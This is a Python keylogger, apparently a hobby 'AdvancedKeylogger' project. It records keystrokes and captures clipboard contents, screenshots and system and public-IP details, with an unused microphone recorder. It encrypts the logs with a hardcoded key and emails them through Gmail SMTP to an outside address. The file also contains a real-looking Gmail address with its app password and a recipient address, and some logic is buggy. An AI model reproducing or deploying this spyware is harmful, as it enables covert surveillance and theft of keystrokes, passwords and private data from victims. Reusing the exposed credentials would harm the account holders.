# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import sys
import socket
import time
import platform
import os
import win32clipboard

from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Paths and filenames
keys_information = "keys_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_encrypt = "keys_encrypt.txt"
system_information_encrypt = "systeminfo_encrypt.txt"
clipboard_information_encrypt = "clipboard_encrypt.txt"

microphone_time = 10
time_iteration = 5
no_of_iterations_end = 3

email_address = "sarveshdgaonkadkar6@gmail.com"
password = "vepo ydet jfqz budr"

username = getpass.getuser()

toaddr = "bruhnerkevin@gmail.com"

key = "b5G14eAaqxPZEGZ_wLugOPAWVF5Hy2b1RlhvDA_UdYw="

file_path = "C:\\Users\\SARVESH\\PycharmProjects\\AdvancedKeylogger\\Project"
encrypted_directory = "C:\\Users\\SARVESH\\PycharmProjects\\AdvancedKeylogger\\Project"

extend = "\\"
file_merge = file_path + extend

# Email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body of the mail"
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, "rb") as file:
        attachment_data = file.read()

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment_data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print("Failed to send email:", str(e))

# Send initial email with key log
send_email(keys_information, file_path + extend + keys_information, toaddr)

# Get computer information
def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Failed to get Public IP Address")

        f.write("Processor: " + (platform.platform()) + '\n')
        f.write("System: " + (platform.system()) + " " + platform.version() + '\n')
        f.write("Machine: " + (platform.machine()) + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddress + '\n')

computer_information()

# Get clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Failed to copy Clipboard")

copy_clipboard()

# Get microphone audio
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# Get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Timer for keylogger
no_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while no_of_iterations < no_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "a") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        no_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# count = 0
# keys = []
# currentTime = time.time()
# stoppingTime = currentTime + time_iteration
#
# def on_press(key):
#     global keys, count, currentTime
#
#     print(key)
#     keys.append(key)
#     count += 1
#     currentTime = time.time()
#
#     if count >= 1:
#         count = 0
#         write_file(keys)
#         keys = []
#
# def write_file(keys):
#     with open(file_path + extend + keys_information, "a") as f:
#         for key in keys:
#             k = str(key).replace("'", "")
#             if k == "space":
#                 f.write("\n")
#             else:
#                 f.write(k)
#         f.close()  # Move the file closing outside the loop
#
# def on_release(key):
#     global currentTime
#
#     if key == Key.esc:
#         return False
#     if currentTime > stoppingTime:
#         return False
#     return True  # Ensure to return True to continue listening
#
# while no_of_iterations < no_of_iterations_end:
#     with Listener(on_press=on_press, on_release=on_release) as listener:
#         listener.join()
#
#     if currentTime > stoppingTime:
#         with open(file_path + extend + keys_information, "a") as f:
#             f.write(" ")
#
#         screenshot()
#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
#
#         copy_clipboard()
#
#         no_of_iterations += 1
#         currentTime = time.time()
#         stoppingTime = currentTime + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_files = [encrypted_directory + system_information_encrypt,
                   encrypted_directory + clipboard_information_encrypt,
                   encrypted_directory + keys_information_encrypt]

for i, encrypting_file in enumerate(files_to_encrypt):
    with open(encrypting_file, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_files[i], "wb") as f:
        f.write(encrypted_data)

    send_email(encrypted_files[i], encrypted_files[i], toaddr)

# Clean up and delete files
# delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
# for file in delete_files:
#     os.remove(file_merge + file)

sys.exit()